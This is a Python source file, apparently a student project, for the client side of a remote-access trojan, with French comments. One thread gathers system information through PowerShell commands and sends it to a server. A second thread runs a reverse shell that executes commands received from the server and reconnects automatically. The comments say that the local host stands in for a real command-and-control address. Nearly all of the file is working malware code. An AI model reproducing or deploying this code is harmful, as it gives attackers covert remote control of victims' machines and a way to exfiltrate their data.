#!/usr/bin/env python
# coding=utf-8


__author__ = 'Karl Boulais'

import socket
import os
import sys
import json
import threading
import subprocess
from time import sleep

from powershell import Powershell

class Client():
    def __init__(self):
        self._connectionThreadList = [self._sendingData, self._ReverseShell]

    def _connection(self, s, host, port):
        while True:
            try:
                s.connect((host, port))
                break
            except TimeoutError:
                continue
            except ConnectionRefusedError:
                continue

    def _sending(self, s, data):
        return s.send(bytes(json.dumps(data), "UTF-8"))
         
    def _receiving(self, s):
        data = ""
        while True:
            try:
                data += s.recv(1024).decode("UTF-8").strip()
                return json.loads(data)
            except ValueError:
                continue
        
    def _sendingData(self):
        # Dans un cas réel on changerais 'ip' pour l'adresse réel du serveur de commande et contrôle
        ip = socket.gethostname()
        host = ip
        port = 9999

        s = socket.socket()
        # Démarre le processus de connexion
        self._connection(s, host, port)

        data = {}
        
        # envoi les données du système
        for command in Powershell.GetInfo:
            data[command.name] = subprocess.check_output(command.value).decode("Windows-1252")
            
        data["message"] = "exit"
        self._sending(s, data)
        s.close


    def _ReverseShell(self):
        # Dans un cas réel on changerais 'ip' pour l'adresse réel du serveur de commande et contrôle
        ip = socket.gethostname() 
        host = ip
        port = 6666

        
        # Démarre le processus de connexion
        try:
            s = socket.socket()
            self._connection(s, host, port)


            quitting = False
            data = {}

            while not quitting:
                data["cwd"] = os.getcwd()

                # on envoit le résultat de la commande
                self._sending(s, data)

                # on reçoit la commande à exécuter
                data = self._receiving(s)

                if data["command"].lower() == "destroy":
                    quitting = True
                    self._sending(s, data)
                    s.close()

                commandArgs = data["command"].split()
                if commandArgs[0].lower() == "cd":
                    try:
                        os.chdir(' '.join(commandArgs[1:]))
                    except Exception as e:
                        if e == FileNotFoundError: 
                            data["output"] = str(e)
                        else:
                            data["output"] = ""
                else:
                    data["output"] = subprocess.getoutput(data["command"])
        except ConnectionResetError:
            # Si le serveur casse la connexion subitement on recommence le processus
            s.close()
            self._ReverseShell()
            

    def main(self):
        for connection in self._connectionThreadList:
            threading.Thread(target=connection).start()


if __name__ == "__main__":
   Client().main()


'''
.. rubric:: Notes de bas de page

.. [1]  https://www.tutorialspoint.com/python_network_programming/python_sockets_programming.htm 
        Principe de base d'une connexion TCP avec le module socket
.. [2]  https://gist.github.com/Integralist/3f004c3594bbf8431c15ed6db15809ae
        Utilisation de thread pour prendre en charge plusieurs connexions client à la fois
'''